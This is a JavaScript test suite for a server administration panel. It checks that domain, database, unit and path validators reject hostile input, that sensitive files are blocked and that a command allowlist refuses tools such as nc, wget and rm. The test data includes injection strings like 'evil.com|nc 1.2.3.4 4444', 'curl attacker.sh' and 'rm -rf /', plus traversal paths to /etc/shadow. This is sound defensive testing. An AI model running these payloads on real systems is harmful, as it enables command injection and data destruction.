import { existsSync, unlinkSync, mkdirSync, symlinkSync, rmSync } from "node:fs";
import {
  assertDomain,
  assertDatabaseName,
  assertUnit,
  assertDbHost,
  assertBackupFile,
  resolveSafePath,
  assertNotSensitive,
  PROTECTED_UNITS,
} from "../server/lib/validate.js";
import { run, isAllowed } from "../server/lib/exec.js";
import { currentCode, verifyCode, generateSecret, base32Encode, base32Decode } from "../server/lib/totp.js";
import { parseCertificates } from "../server/lib/certbot.js";
import { parseRows } from "../server/lib/mariadb.js";
import { parseCsv } from "../server/lib/postgres.js";
import { APPS, TEMPLATES } from "../server/apps/catalog.js";
import { buildVars } from "../server/lib/apps/installer.js";

let passed = 0;
let failed = 0;

function check(name, fn) {
  try {
    const result = fn();
    if (result === false) throw new Error("assertion returned false");
    passed += 1;
    console.log(`  ok   ${name}`);
  } catch (error) {
    failed += 1;
    console.log(`  FAIL ${name}\n         ${error.message}`);
  }
}

function rejects(fn) {
  try {
    fn();
  } catch {
    return true;
  }
  throw new Error("expected it to be rejected, but it was accepted");
}

function accepts(fn) {
  fn();
  return true;
}

console.log("\nInjection and validation");

const HOSTILE = [
  "evil.com; rm -rf /",
  "evil.com && curl attacker.sh",
  "$(id).com",
  "`whoami`.com",
  "evil.com|nc 1.2.3.4 4444",
  "evil.com\nrm -rf /",
  "-evil.com",
  "..",
  "evil..com",
  "a.com/../../etc/passwd",
];

for (const value of HOSTILE) {
  check(`domain rejected: ${JSON.stringify(value)}`, () => rejects(() => assertDomain(value)));
}

check("valid domain accepted", () => accepts(() => assertDomain("panel.example.com")));

for (const value of ["db; DROP DATABASE x", "db`x`", "db name", "db--", 'db"quote', "db'quote", "a".repeat(65)]) {
  check(`db name rejected: ${JSON.stringify(value)}`, () => rejects(() => assertDatabaseName(value)));
}

check("valid db name accepted", () => accepts(() => assertDatabaseName("example_db$1")));

check("protected unit ssh.service rejected", () => rejects(() => assertUnit("ssh.service")));
check("systemd-* unit rejected", () => rejects(() => assertUnit("systemd-journald.service")));
check("webpanel.service rejected", () => rejects(() => assertUnit("webpanel.service")));
check("arbitrary unit path rejected", () => rejects(() => assertUnit("../../etc/passwd")));
check("normal unit accepted", () => accepts(() => assertUnit("nginx.service")));
check("protected unit list is populated", () => PROTECTED_UNITS.size > 5);

check("db host injection rejected", () => rejects(() => assertDbHost("localhost'; DROP USER x; --")));
check("backup traversal rejected", () => rejects(() => assertBackupFile("../../etc/shadow")));
check("backup traversal rejected (encoded)", () => rejects(() => assertBackupFile("..%2f..%2fetc%2fpasswd")));

console.log("\nPath containment");

const ROOTS = ["/var/www", "/etc/nginx", "/root", "/var/log"];

const SCRATCH = process.env.COMMANDCODE_SCRATCHPAD || "/tmp";
const TEST_ROOT = `${SCRATCH}/path-test-root`;
rmSync(TEST_ROOT, { recursive: true, force: true });
mkdirSync(`${TEST_ROOT}/sub`, { recursive: true });
symlinkSync("/etc", `${TEST_ROOT}/escape`);

check("path traversal outside roots rejected", () =>
  rejects(() => resolveSafePath("/etc/nginx/../../etc/shadow", ROOTS)));
check("escape to a non-permitted path rejected", () =>
  rejects(() => resolveSafePath("/var/www/../../etc/passwd", ["/var/www"])));
check("absolute escape rejected", () => rejects(() => resolveSafePath("/etc/passwd", ROOTS)));
check("symlink pointing outside the root is rejected", () =>
  rejects(() => resolveSafePath(`${TEST_ROOT}/escape/passwd`, [TEST_ROOT])));
check("new file through a symlink is rejected", () =>
  rejects(() => resolveSafePath(`${TEST_ROOT}/escape/newdir/new.txt`, [TEST_ROOT])));
check("null byte rejected", () => rejects(() => resolveSafePath("/var/www/a\0b", ROOTS)));
check("relative path rejected", () => rejects(() => resolveSafePath("var/www/x", ROOTS)));
check("path inside root accepted", () => accepts(() => resolveSafePath("/var/www/example.com/public", ROOTS)));
check("not-yet-created file inside root accepted", () =>
  accepts(() => resolveSafePath(`${TEST_ROOT}/sub/new.txt`, [TEST_ROOT])));
check("path equal to root accepted", () => accepts(() => resolveSafePath("/var/www", ROOTS)));

rmSync(TEST_ROOT, { recursive: true, force: true });

console.log("\nPrivate key protection");

check("ssh private key blocked", () => rejects(() => assertNotSensitive("/root/.ssh/id_rsa")));
check("letsencrypt privkey blocked", () => rejects(() => assertNotSensitive("/etc/letsencrypt/live/example.com/privkey.pem")));
check("arbitrary .key blocked", () => rejects(() => assertNotSensitive("/root/certs/server.key")));
check("shadow file blocked", () => rejects(() => assertNotSensitive("/etc/shadow")));
check("nginx config allowed", () => accepts(() => assertNotSensitive("/etc/nginx/sites-available/example_site")));

console.log("\nCommand execution safety");

// The app installer needs curl/unzip/php/composer/npm. Those are only ever
// invoked with arguments defined in server/apps/catalog.js — never with user
// input — which is asserted by the catalogue checks below.
check("installer binaries are allowlisted", () =>
  isAllowed("curl") && isAllowed("unzip") && isAllowed("php") && isAllowed("composer") && isAllowed("npm"));
check("core binaries are permitted", () => isAllowed("nginx") && isAllowed("psql") && isAllowed("systemctl") && isAllowed("certbot"));

for (const binary of ["rm", "wget", "nc", "python3", "perl", "sed", "awk", "env", "xargs", "dd", "tee", "eval"]) {
  check(`arbitrary-execution binary refused: ${binary}`, () => isAllowed(binary) === false);
}

const MARKER = "/tmp/webpanel_injection_marker";
if (existsSync(MARKER)) unlinkSync(MARKER);

await (async () => {
  await run("df", ["-P;touch " + MARKER]).catch(() => {});
  await run("df", ["$(touch " + MARKER + ")"]).catch(() => {});
  await run("df", ["-P && touch " + MARKER]).catch(() => {});
  check("metacharacters are inert (no shell interpolation)", () => {
    if (existsSync(MARKER)) {
      unlinkSync(MARKER);
      throw new Error("a shell command executed from an argument!");
    }
    return true;
  });

  const rejectedBinary = await run("wget", ["http://example.com"]).then(
    () => false,
    () => true,
  );
  check("disallowed binary refuses to run", () => rejectedBinary);

  const nonStringArg = await run("df", [42]).then(
    () => false,
    () => true,
  );
  check("non-string argument refuses to run", () => nonStringArg);

  const realRun = await run("df", ["-P"]);
  check("legitimate command still works", () => realRun.ok === true);
})();

console.log("\nTOTP");

check("RFC 6238 test vector matches", () => {
  const secret = base32Encode(Buffer.from("12345678901234567890"));
  if (secret !== "GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ") throw new Error(`unexpected secret ${secret}`);
  const code = currentCode(secret, 59 * 1000);
  if (code !== "287082") throw new Error(`expected 287082, got ${code}`);
  return true;
});

check("base32 round-trips", () => {
  const original = Buffer.from("the quick brown fox");
  const round = base32Decode(base32Encode(original));
  if (!round.equals(original)) throw new Error("base32 round trip failed");
  return true;
});

check("verifyCode accepts the current code", () => {
  const secret = generateSecret();
  if (!verifyCode(secret, currentCode(secret))) throw new Error("current code rejected");
  return true;
});

check("verifyCode rejects a wrong code", () => {
  const secret = generateSecret();
  const wrong = currentCode(secret) === "000000" ? "111111" : "000000";
  if (verifyCode(secret, wrong)) throw new Error("wrong code accepted");
  return true;
});

check("verifyCode rejects malformed input", () => {
  const secret = generateSecret();
  if (verifyCode(secret, "abcdef") || verifyCode(secret, "12345") || verifyCode(secret, "")) {
    throw new Error("malformed token accepted");
  }
  return true;
});

console.log("\nApplication catalogue");

const TRUSTED_HOSTS = new Set([
  "wordpress.org",
  "downloads.wordpress.org",
  "github.com",
  "api.github.com",
  "download.prestashop.com",
]);

const CATALOG_STEP_TYPES = new Set([
  "download", "extract", "downloadPlugins", "createDatabase", "createDatabaseUser",
  "writeFile", "chown", "createSite", "createStaticSite", "createProxySite", "requestCertificate",
  "downloadWpCli", "run", "ensurePostgres", "pm2Start",
]);

function collectUrls(app) {
  const spec = app.downloads?.app;
  const urls = [];
  if (spec?.url) urls.push(spec.url);
  if (spec?.["from"] === "github-archive") urls.push(`https://github.com/${spec.repo}/archive/refs/tags/${spec.tag}.zip`);
  for (const plugin of app.downloads?.plugins ?? []) urls.push(plugin.url);
  return urls;
}

function collectPlaceholders(value, found = new Set()) {
  if (typeof value === "string") {
    for (const match of value.matchAll(/\{\{(\w+)\}\}/g)) found.add(match[1]);
  } else if (Array.isArray(value)) {
    for (const item of value) collectPlaceholders(item, found);
  } else if (value && typeof value === "object") {
    for (const item of Object.values(value)) collectPlaceholders(item, found);
  }
  return found;
}

check("catalogue contains applications", () => APPS.length >= 6);

for (const app of APPS) {
  const urls = collectUrls(app);
  if (urls.length === 0) continue;
  check(`${app.id}: downloads use https`, () => {
    for (const url of urls) {
      if (!url.startsWith("https://")) throw new Error(`insecure URL: ${url}`);
    }
    return true;
  });
  check(`${app.id}: download hosts are trusted`, () => {
    for (const url of urls) {
      const host = new URL(url).hostname;
      if (!TRUSTED_HOSTS.has(host)) throw new Error(`untrusted host: ${host}`);
    }
    return true;
  });
}

check("github-backed apps have well-formed repository identifiers", () => {
  // These strings are interpolated into the api.github.com URL that curl fetches.
  const repoPattern = /^[A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+$/;
  for (const app of APPS) {
    const spec = app.downloads?.app;
    if (spec?.from === "github" || spec?.from === "github-archive") {
      if (!repoPattern.test(spec.repo)) throw new Error(`${app.id}: malformed repo "${spec.repo}"`);
    }
    if (app.downloads?.wpCli && !repoPattern.test(app.downloads.wpCli.repo)) {
      throw new Error(`${app.id}: malformed wp-cli repo`);
    }
  }
  return true;
});

check("every plan step uses a known step type", () => {
  for (const app of APPS) {
    for (const step of app.plan ?? []) {
      if (!CATALOG_STEP_TYPES.has(step.type)) throw new Error(`${app.id}: unknown step ${step.type}`);
    }
    const downloadType = app.downloads?.app?.type;
    if (downloadType === "composer" && !(app.plan ?? []).some((step) => step.bin === "composer")) {
      throw new Error(`${app.id}: composer download but no composer step`);
    }
  }
  return true;
});

check("every placeholder resolves to a real install variable", () => {
  for (const app of APPS) {
    const vars = buildVars(app, { domain: "example.com" }, "test");
    const known = new Set(Object.keys(vars));
    const used = new Set();
    for (const step of app.plan ?? []) collectPlaceholders(step, used);
    collectPlaceholders(app.manualRecipe ?? [], used);
    collectPlaceholders(TEMPLATES, used);
    for (const used_key of used) {
      if (!known.has(used_key)) throw new Error(`${app.id}: unresolved placeholder {{${used_key}}}`);
    }
  }
  return true;
});

check("unattended installers are marked automated, interactive ones are not", () => {
  for (const app of APPS) {
    if (app.automated === false) {
      if ((app.plan ?? []).length > 0) throw new Error(`${app.id}: manual app should not define a plan`);
      if (!(app.manualRecipe ?? []).length) throw new Error(`${app.id}: manual app needs a recipe`);
    } else if ((app.plan ?? []).length === 0) {
      throw new Error(`${app.id}: automated app has an empty plan`);
    }
  }
  return true;
});

console.log("\nOutput parsing");

check("certbot output is parsed", () => {
  const sample = [
    "Found the following certs:",
    "  Certificate Name: example.com",
    "    Serial Number: 4abc",
    "    Key Type: RSA",
    "    Domains: example.com www.example.com",
    "    Expiry Date: 2026-11-30 12:00:00+00:00 (VALID: 74 days)",
    "    Certificate Path: /etc/letsencrypt/live/example.com/fullchain.pem",
    "    Private Key Path: /etc/letsencrypt/live/example.com/privkey.pem",
    "",
  ].join("\n");
  const certs = parseCertificates(sample);
  if (certs.length !== 1) throw new Error(`expected 1 certificate, got ${certs.length}`);
  if (certs[0].name !== "example.com") throw new Error("wrong certificate name");
  if (certs[0].daysRemaining !== 74) throw new Error("wrong expiry days");
  if (certs[0].domains.length !== 2) throw new Error("wrong domain count");
  return true;
});

check("mysql TSV output is parsed", () => {
  const parsed = parseRows("name\tbytes\napp_db\t2048\nanalytics_db\t1024\n");
  if (parsed.columns[0] !== "name") throw new Error("bad columns");
  if (parsed.rows.length !== 2) throw new Error("bad row count");
  return true;
});

check("postgres CSV output is parsed, including quoted commas", () => {
  const parsed = parseCsv('name,size\n"my,db",8192\nplain,1024\n');
  if (parsed.rows.length !== 2) throw new Error("bad row count");
  if (parsed.rows[0][0] !== "my,db") throw new Error(`quote handling failed: ${parsed.rows[0][0]}`);
  return true;
});

console.log(`\n${passed} passed, ${failed} failed\n`);
process.exit(failed > 0 ? 1 : 0);
